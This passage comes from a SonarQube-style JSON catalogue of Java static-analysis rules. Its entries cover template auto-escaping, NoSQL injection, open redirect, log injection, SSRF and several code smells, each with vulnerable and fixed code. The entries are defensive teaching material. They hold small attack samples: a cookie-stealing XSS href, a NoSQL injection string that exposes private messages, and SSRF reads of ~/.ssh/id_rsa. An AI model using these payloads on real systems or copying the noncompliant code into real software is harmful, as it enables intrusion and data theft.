</li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 - Category A8 - Software and Data\n  Integrity Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization\">Top 10 2017 - Category A8 - Insecure\n  Deserialization</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/502\">CWE-502 - Deserialization of Untrusted Data</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5301","summary":"\"ActiveMQConnectionFactory\" should not be vulnerable to malicious code deserialization","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The dangling <code>else</code> problem appears when nested <code>if</code>/<code>else</code>&nbsp;statements are written without curly braces. In\nthis case, <code>else</code> is associated with the nearest&nbsp;<code>if</code> but that is not always obvious and sometimes the indentation can also\nbe misleading.</p>\n<p>This rules reports <code>else</code> statements that are difficult to understand, because they are inside nested <code>if</code> statements without\ncurly braces.</p>\n<p>Adding curly braces can generally make the code clearer (see rule {rule:java:S121} ), and in this situation of dangling <code>else</code>, it\nreally clarifies the intention of the code.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n if (a)\n   if (b)\n     d++;\n else     // Noncompliant, is the \"else\" associated with \"if(a)\" or \"if (b)\"? (the answer is \"if(b)\")\n   e++;\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n if (a) {\n   if (b) {\n     d++;\n   }\n } else { // Compliant, there is no doubt the \"else\" is associated with \"if(a)\"\n   e++;\n }\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Dangling_else\">https://en.wikipedia.org/wiki/Dangling_else</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5261","summary":"\"else\" statements should be clearly matched with an \"if\"","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,\n<code>Groovy's template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters\nthat make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>\n<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a\nhref=\"https://twig.symfony.com/doc/3.x/filters/escape.html\">the strategy applied</a> and the context, for example a \"html auto-escaping\" strategy\n(which only transforms html characters into <a href=\"https://developer.mozilla.org/en-US/docs/Glossary/Entity\">html entities</a>) will not be relevant\nwhen variables are used in a <a href=\"https://en.wikipedia.org/wiki/HTML_attribute\">html attribute</a> because '<code>:</code>' character is not\nescaped and thus an attack as below is possible:</p>\n<pre>\n&lt;a href=\"{{ myLink }}\"&gt;link&lt;/a&gt; // myLink = javascript:alert(document.cookie)\n&lt;a href=\"javascript:alert(document.cookie)\"&gt;link&lt;/a&gt; // JS injection (XSS attack)\n</pre>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Templates are used to render web content and\n    <ul>\n      <li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li>\n      <li> there is no local mechanism in place to sanitize or validate the inputs. </li>\n    </ul>  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right\none.</p>\n<h2>Sensitive Code Example</h2>\n<p>With <a href=\"https://github.com/samskivert/jmustache\">JMustache by samskivert</a>:</p>\n<pre>\nMustache.compiler().escapeHTML(false).compile(template).execute(context); // Sensitive\nMustache.compiler().withEscaper(Escapers.NONE).compile(template).execute(context); // Sensitive\n</pre>\n<p>With <a href=\"https://freemarker.apache.org/\">Freemarker</a>:</p>\n<pre>\nfreemarker.template.Configuration configuration = new freemarker.template.Configuration();\nconfiguration.setAutoEscapingPolicy(DISABLE_AUTO_ESCAPING_POLICY); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>With <a href=\"https://github.com/samskivert/jmustache\">JMustache by samskivert</a>:</p>\n<pre>\nMustache.compiler().compile(template).execute(context); // Compliant, auto-escaping is enabled by default\nMustache.compiler().escapeHTML(true).compile(template).execute(context); // Compliant\n</pre>\n<p>With <a href=\"https://freemarker.apache.org/\">Freemarker</a>. See <a\nhref=\"https://freemarker.apache.org/docs/api/freemarker/template/Configuration.html#setAutoEscapingPolicy-int-\">\"setAutoEscapingPolicy\"\ndocumentation</a> for more details.</p>\n<pre>\nfreemarker.template.Configuration configuration = new freemarker.template.Configuration();\nconfiguration.setAutoEscapingPolicy(ENABLE_IF_DEFAULT_AUTO_ESCAPING_POLICY); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> <a href=\"https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md\">OWASP Cheat\n  Sheet</a> - XSS Prevention Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5247","summary":"Disabling auto-escaping in template engines is security-sensitive","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Many existing switch statements are essentially simulations of switch expressions, where each arm either assigns to a common target variable or\nreturns a value. Expressing this as a statement is roundabout, repetitive, and error-prone.</p>\n<p>Java 14 added support for switch expressions, which provide more succinct and less error-prone version of switch.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nvoid day_of_week(DoW day) {\n    int numLetters;\n    switch (day) {  // Noncompliant\n      case MONDAY:\n      case FRIDAY:\n      case SUNDAY:\n        numLetters = 6;\n        break;\n      case TUESDAY:\n        numLetters = 7;\n        break;\n      case THURSDAY:\n      case SATURDAY:\n        numLetters = 8;\n        break;\n      case WEDNESDAY:\n        numLetters = 9;\n        break;\n      default:\n        throw new IllegalStateException(\"Wat: \" + day);\n    }\n}\n\nint return_switch(int x) {\n    switch (x) { // Noncompliant\n      case 1:\n        return 1;\n      case 2:\n        return 2;\n      default:\n        throw new IllegalStateException();\n    }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nint numLetters = switch (day) {\n    case MONDAY, FRIDAY, SUNDAY -&gt; 6;\n    case TUESDAY                -&gt; 7;\n    case THURSDAY, SATURDAY     -&gt; 8;\n    case WEDNESDAY              -&gt; 9;\n};\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-5194","summary":"Use Java 14 \"switch\" expression","tags":["java14"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>ThreadLocal</code> variables are supposed to be garbage collected once the holding thread is no longer alive. Memory leaks can occur when\nholding threads are re-used which is the case on application servers using pool of threads.</p>\n<p>To avoid such problems, it is recommended to always clean up <code>ThreadLocal</code> variables using the <code>remove()</code> method to remove\nthe current threadâs value for the <code>ThreadLocal</code> variable.</p>\n<p>In addition, calling <code>set(null)</code> to remove the value might keep the reference to <code>this</code> pointer in the map, which can cause\nmemory leak in some scenarios. Using <code>remove</code> is safer to avoid this issue.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class ThreadLocalUserSession implements UserSession {\n\n  private static final ThreadLocal&lt;UserSession&gt; DELEGATE = new ThreadLocal&lt;&gt;();\n\n  public UserSession get() {\n    UserSession session = DELEGATE.get();\n    if (session != null) {\n      return session;\n    }\n    throw new UnauthorizedException(\"User is not authenticated\");\n  }\n\n  public void set(UserSession session) {\n    DELEGATE.set(session);\n  }\n\n   public void incorrectCleanup() {\n     DELEGATE.set(null); // Noncompliant\n   }\n\n  // some other methods without a call to DELEGATE.remove()\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class ThreadLocalUserSession implements UserSession {\n\n  private static final ThreadLocal&lt;UserSession&gt; DELEGATE = new ThreadLocal&lt;&gt;();\n\n  public UserSession get() {\n    UserSession session = DELEGATE.get();\n    if (session != null) {\n      return session;\n    }\n    throw new UnauthorizedException(\"User is not authenticated\");\n  }\n\n  public void set(UserSession session) {\n    DELEGATE.set(session);\n  }\n\n  public void unload() {\n    DELEGATE.remove(); // Compliant\n  }\n\n  // ...\n}\n</pre>\n<h3>Exceptions</h3>\n<p>Rule will not detect non-private <code>ThreadLocal</code> variables, because <code>remove()</code> can be called from another class.</p>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/java-memory-leaks\">Understanding Memory Leaks in Java</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-5164","summary":"\"ThreadLocal\" variables should be cleaned up when no longer used ","tags":["leak","performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>NoSQL injections occur when an application retrieves untrusted data and inserts it into a database query without sanitizing it first.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application that is vulnerable to NoSQL injection:<br> After discovering the injection point, attackers insert data into\nthe vulnerable field to execute malicious commands in the affected databases.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Identity spoofing and data leakage</h4>\n<p>In the context of simple query logic breakouts, a malicious database query enables privilege escalation or direct data leakage from one or more\ndatabases.<br> This threat is the most widespread impact.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the\nattacked organization does not maintain a disaster recovery plan (DRP) as missing data can disrupt the regular operations of an organization.</p>\n<h4>Chaining NoSQL injections with other vulnerabilities</h4>\n<p>Attackers who exploit NoSQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some\ndefense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple\nattacks with great impact:</p>\n<ul>\n  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>\n  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE). </li>\n</ul>\n<h2>How to fix it in Legacy Mongo Java API</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to NoSQL injections because untrusted data is concatenated to the <code>$where</code> operator. This operator\nindicates to the backend that the expression needs to be interpreted, resulting in code injection.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport com.mongodb.MongoClient;\nimport com.mongodb.DB;\nimport com.mongodb.DBCollection;\nimport com.mongodb.BasicDBObject;\n\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws UnknownHostException\n{\n    String input = req.getParameter(\"input\");\n\n    MongoClient mongoClient = new MongoClient();\n    DB database             = mongoClient.getDB(\"ExampleDatabase\");\n    DBCollection collection = database.getCollection(\"exampleCollection\");\n    BasicDBObject query     = new BasicDBObject();\n\n    query.append(\"$where\", \"this.field == \\\"\" + input + \"\\\"\");\n\n    collection.find(query);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport com.mongodb.MongoClient;\nimport com.mongodb.DB;\nimport com.mongodb.DBCollection;\nimport com.mongodb.BasicDBObject;\n\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws UnknownHostException\n{\n    String input = req.getParameter(\"input\");\n\n    MongoClient mongoClient = new MongoClient();\n    DB database             = mongoClient.getDB(\"ExampleDatabase\");\n    DBCollection collection = database.getCollection(\"exampleCollection\");\n    BasicDBObject query     = new BasicDBObject();\n\n    query.append(\"field\", input);\n\n    collection.find(query);\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-approved list</h4>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the\ninitially intended logic.</p>\n<p>For NoSQL injections, the cleanest way to do so is to validate the input before using it in a query.</p>\n<p>Create a list of authorized and secure strings that you want the application to be able to use in a query.<br> If a user input does not match an\nentry in this list, it should be rejected because it is considered unsafe.</p>\n<p>The list can be either a regex string, an array, or validators on specific ranges of characters. If you use regexes, choose simple regexes to avoid\nReDOS attacks.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h4>Operators are to be classified as dangerous</h4>\n<p>As a rule of thumb if no operators are needed, you should generally reject user input containing them. If some operators are necessary, you should\nrestrict their use.</p>\n<p>Some operators execute JavaScript, and their use should be restricted for both untrusted input and internal code.<br> These operators include:</p>\n<ul>\n  <li> <code>$where</code> </li>\n  <li> <code>$function</code> </li>\n  <li> <code>$accumulator</code> </li>\n  <li> <code>mapReduce</code> </li>\n</ul>\n<p>Depending on your use case, you should first try using regular API calls before using any of these operators.<br> For example, using a\n<code>$where</code> operator is unnecessarily complex when only a simple search is required. It also leads to performance problems.</p>\n<p><strong>Note</strong>: <a href=\"https://www.mongodb.com/docs/manual/reference/operator/query/where/#javascript-enablement\">Server-side scripting\ncan be disabled</a>.</p>\n<p>Regular operators can also lead to data leaks.<br> For example, attackers can use \"comparison query operators\" in their attack data to trick the\nbackend database into giving hints about sensitive information or entirely giving it out.</p>\n<p>In the previous example, the untrusted data doesnât need validation for its use case. Moving it out of a <code>$where</code> expression into a\nproper field query is enough.</p>\n<h2>How to fix it in Spring Data Redis</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to NoSQL injections because untrusted data is concatenated to a Redis script. Such a script is used to perform\nadvanced queries on a Redis instance so that an injection in it might result in the compromise of the Redis instance.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.data.redis.core.script.RedisScript;\n\n@RestController\n@RequestMapping(path = \"/redis\")\npublic class RedisController {\n\n    @Autowired RedisTemplate&lt;String, Object&gt; redisTemplate;\n\n    @GetMapping(\"/template/redisscript/echo/{echo}\")\n    public String templateRedisScriptCompliant(@PathVariable String echo) {\n        String script = \"return \" + echo + \";\";\n        Object result = redisTemplate.execute(RedisScript.of(script, Object.class), new ArrayList&lt;String&gt;()); // Noncompliant\n        return result.toString();\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.data.redis.core.script.RedisScript;\n\n@RestController\n@RequestMapping(path = \"/redis\")\npublic class RedisController {\n\n    @Autowired RedisTemplate&lt;String, Object&gt; redisTemplate;\n\n    @GetMapping(\"/template/redisscript/echo/{echo}\")\n    public String templateRedisScriptCompliant(@PathVariable String echo) {\n        String script = \"return ARGV[1];\";\n        Object result = redisTemplate.execute(RedisScript.of(script, Object.class), new ArrayList&lt;String&gt;(), echo);\n        return result.toString();\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Here, the compliant solution passes the untrusted data as a parameter to the Redis script. This ensures the data will be treated as a single value\nand will not tamper with the script semantics.</p>\n<h2>How to fix it in Spring Data MongoDB</h2>\n<h3>Code examples</h3>\n<p>The following code is an example of a simple API endpoint designed to read public messages. It is vulnerable to NoSQL injection because\nuser-controlled data is inserted directly into a query string. The application assumes that incoming data always has a specific range of characters\nand ignores that some characters may change the query logic to a malicious one.</p>\n<p>In this particular case, the query can be exploited with the following values:</p>\n<ul>\n  <li> <code>username=user1', private:true}},{a:'</code> </li>\n</ul>\n<p>By adapting and inserting these values, an attacker can bypass the <code>private = false</code> condition and get access to private messages.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\n@RestController\npublic class ApiController {\n    @Autowired\n    MongoClient mongoClient;\n\n    @GetMapping(value = \"/read\")\n    @ResponseBody\n    List&lt;String&gt; readPublicOnly(@RequestParam(value = \"username\") String username) {\n        MongoOperations template = new MongoTemplate(mongoClient, \"demo\");\n        BasicQuery query = new BasicQuery(\"{ username:'\"+username+\"', private: false }\"); // Noncompliant\n        return template.find(query, String.class, \"messages\");\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\n@RestController\npublic class ApiController {\n    @Autowired\n    MongoClient mongoClient;\n\n    @GetMapping(value = \"/read\")\n    @ResponseBody\n    List&lt;String&gt; readPublicOnly(@RequestParam(value = \"username\") String username) {\n        MongoOperations template = new MongoTemplate(mongoClient, \"demo\");\n        Query query = Query.query(Criteria.where(\"username\").is(username).and(\"private\").is(false));\n        return template.find(query, String.class, \"messages\");\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>The compliant solution uses the <code>Query</code> and <code>Critera</code> objects to build the query syntax safely.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> SonarSource - <a href=\"https://blog.sonarsource.com/nosql-injections-in-rocket-chat/\">NoSQL Injections in Rocket.Chat 3.12.1</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/943\">CWE-943 - Improper Neutralization of Special Elements in Data Query Logic</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5147","summary":"NoSQL operations should not be vulnerable to injection attacks","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.4.0.54424","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>\n<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as\n<code>https://trusted.example.com?url=evil.example.com</code>, to redirect the victim to his evil domain.</p>\n<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker\nto build a credible pretext to prevent suspicions from the victim.<br></p>\n<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>\n<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Domain Mirroring</h4>\n<p>A malicious link redirects to an attackerâs controlled website mirroring the interface of a web application trusted by the user. Due to the\nsimilarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a\nmalicious domain.<br></p>\n<p>Depending on the attackerâs purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any\nauthenticated data or action.</p>\n<h4>Malware Distribution</h4>\n<p>A malicious link redirects to an attackerâs controlled website that serves malware. On the same basis as the domain mirroring exploitation, the\nattacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a\nhosted malicious file.<br> The worst-case scenario could result in complete system compromise.</p>\n<h2>How to fix it in a Servlet</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used\nto redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n  String location = req.getParameter(\"url\");\n  resp.sendRedirect(location);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n  String location = req.getParameter(\"url\");\n\n  List&lt;String&gt; allowedHosts = new ArrayList&lt;String&gt;();\n  allowedHosts.add(\"https://trusted1.example.com/\");\n  allowedHosts.add(\"https://trusted2.example.com/\");\n\n  if (allowedHosts.contains(location))\n    resp.sendRedirect(location);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in\nmethods are engineered for internal page redirections. Thus, they might not be the solution for the readerâs use case.</p>\n<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following\nalternatives:</p>\n<ol>\n  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li>\n  <li> Using an allow-list approach in case the destination URLs are multiple but limited. </li>\n  <li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li>\n</ol>\n<h3>Pitfalls</h3>\n<h4>The trap of 'startsWith' and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>\n<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique\nchanges.</p>\n<p>Thus, a validation like <code>startsWith(\"https://example.com\")</code> or an equivalent with the regex <code>^https://example\\.com.*</code> can be\nexploited with the following URL <code>https://example.com.malicious.example.org</code>. The practice of taking over domains that maliciously look\nlike existing domains is widespread and is called <a href=\"https://en.wikipedia.org/wiki/Cybersquatting\">Cybersquatting</a>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/601\">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5146","summary":"HTTP request redirections should not be open to forging attacks","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Log injection occurs when an application fails to sanitize untrusted data used for logging.</p>\n<p>An attacker can forge log content to prevent an organization from being able to trace back malicious activities.</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker can insert arbitrary data into a log file, the integrity of the chain of events being recorded can be compromised.<br> This\nfrequently occurs because attackers can inject the log entry separator of the logger framework, commonly newlines, and thus insert artificial log\nentries. <br> Other attacks could also occur requiring only field pollution, such as cross-site scripting (XSS) or code injection (for example,\nLog4Shell) if the logged data is fed to other application components, which may interpret the injected data differently.<br></p>\n<p>The focus of this rule is newline character replacement.</p>\n<h4>Log Forge</h4>\n<p>An attacker, able to create independent log entries by injecting log entry separators, inserts bogus data into a log file to conceal his malicious\nactivities. This obscures the content for an incident response team to trace the origin of the breach as the indicators of compromise (IoCs) lead to\nfake application events.</p>\n<h2>How to fix it in Java Logging API</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to log injection as it constructs log entries using untrusted data. An attacker can leverage this to manipulate\nthe chain of events being recorded.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Example {\n  private static final Logger logger = Logger.getLogger(\"Logger\");\n\n  protected void doGet(HttpServletRequest request) {\n    String data = request.getParameter(\"data\");\n    if(data != null){\n      logger.log(Level.INFO, \"Data: {0} \", data);\n    }\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Example {\n  private static final Logger logger = Logger.getLogger(\"Logger\");\n\n  protected void doGet(HttpServletRequest request) {\n    String data = request.getParameter(\"data\");\n    if(data != null){\n      data = data.replaceAll(\"[\\n\\r]\", \"_\");\n      logger.log(Level.INFO, \"Data: {0} \", data);\n    }\n  }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Data used for logging should be content-restricted and typed. This can be done by validating the data content or sanitizing it.<br> Validation and\nsanitization mainly revolve around preventing carriage return (CR) and line feed (LF) characters. However, further actions could be required based on\nthe application context and the logged data usage.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\">Top 10 2021 Category A9 - Security Logging and\n  Monitoring Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">Top 10 2017 Category A10 -\n  Insufficient Logging &amp; Monitoring</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/117\">CWE-117 - Improper Output Neutralization for Logs</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5145","summary":"Logging should not be vulnerable to injection attacks","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br></p>\n<p>An SSRF vulnerability can either be basic or blind, depending on whether the serverâs fetched data is directly returned in the web applicationâs\nresponse.<br> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be\ntreated in the same way as basic SSRF.</p>\n<h3>What is the potential impact?</h3>\n<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to\nwhat is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>\n<p>Information disclosure is SSRFâs core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can\nrange from low to critical severity.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Local file read to host takeover</h4>\n<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File\nURI scheme <code>file://</code>.<br> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web\napplication.</p>\n<h4>Internal Network Reconnaissance</h4>\n<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port\nfield in the URL <code>http://127.0.0.1:{port}</code>.<br> Taking advantage of other supported URL schemas (dependent on the affected system), for\nexample, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>\n<h2>How to fix it in 